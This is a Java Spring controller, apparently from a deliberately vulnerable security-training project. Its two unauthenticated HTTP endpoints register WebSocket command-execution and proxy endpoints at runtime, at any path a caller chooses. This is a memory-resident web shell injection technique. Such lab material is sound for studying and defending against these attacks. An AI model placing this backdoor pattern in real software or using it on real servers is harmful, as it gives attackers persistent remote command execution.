package org.joychou.controller;

import org.apache.tomcat.websocket.server.WsServerContainer;
import org.joychou.config.WebSocketsProxyEndpoint;
import org.joychou.config.WebSocketsCmdEndpoint;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.websocket.server.ServerContainer;
import javax.websocket.server.ServerEndpointConfig;


@RestController
public class WebSockets {

    /**
     * <p>动态添加WebSockets实现命令执行</p>
     * <p>
     * 1. WebSocket的端口和Spring端口一致。<br>
     * 2. 如果应用需要登录，动态添加的WebSocket路由不能要求被登录，否则添加失败。
     * </p>
     * <p>
     *    <a href="http://localhost:8080/websocket/cmd?path=/ws/shell">http://localhost:8080/websocket/cmd?path=/ws/shell</a> <br>
     *    WebSockets 的URL为ws://127.0.0.1:8080/ws/shell
     * </p>
     * <p>JoyChou @ 2023年02月20日 </p>
     */
    @RequestMapping("/websocket/cmd")
    public String cmdInject(HttpServletRequest req) {
        String path = req.getParameter("path");
        if (path == null) {
            return "path is null";
        }
        ServletContext sc = req.getServletContext();
        try {
            ServerEndpointConfig sec = ServerEndpointConfig.Builder.create(WebSocketsCmdEndpoint.class, path).build();
            WsServerContainer wsc = (WsServerContainer) sc.getAttribute(ServerContainer.class.getName());
            if (wsc.findMapping(path) == null) {
                wsc.addEndpoint(sec);
                System.out.println("[+] Websocket: " + path + " inject success!!!");
                return "[+] Websocket: " + path + " inject success!!!";
            } else {
                System.out.println("[-] Websocket: " + path + " has been injected!");
                return "[-] Websocket: " + path + " has been injected!";
            }
        } catch (Exception e) {
            return e.toString();
        }
    }

    @RequestMapping("/websocket/proxy")
    public String proxyInject(HttpServletRequest req) {
        String path = req.getParameter("path");
        if (path == null) {
            return "path is null";
        }
        ServletContext sc = req.getServletContext();
        try {
            ServerEndpointConfig sec = ServerEndpointConfig.Builder.create(WebSocketsProxyEndpoint.class, path).build();
            WsServerContainer wsc = (WsServerContainer) sc.getAttribute(ServerContainer.class.getName());
            if (wsc.findMapping(path) == null) {
                wsc.addEndpoint(sec);
                System.out.println("[+] Websocket: " + path + " inject success!!!");
                return "[+] Websocket: " + path + " inject success!!!";
            } else {
                System.out.println("[-] Websocket: " + path + " has been injected!");
                return "[-] Websocket: " + path + " has been injected!";
            }
        } catch (Exception e) {
            return e.toString();
        }
    }

}
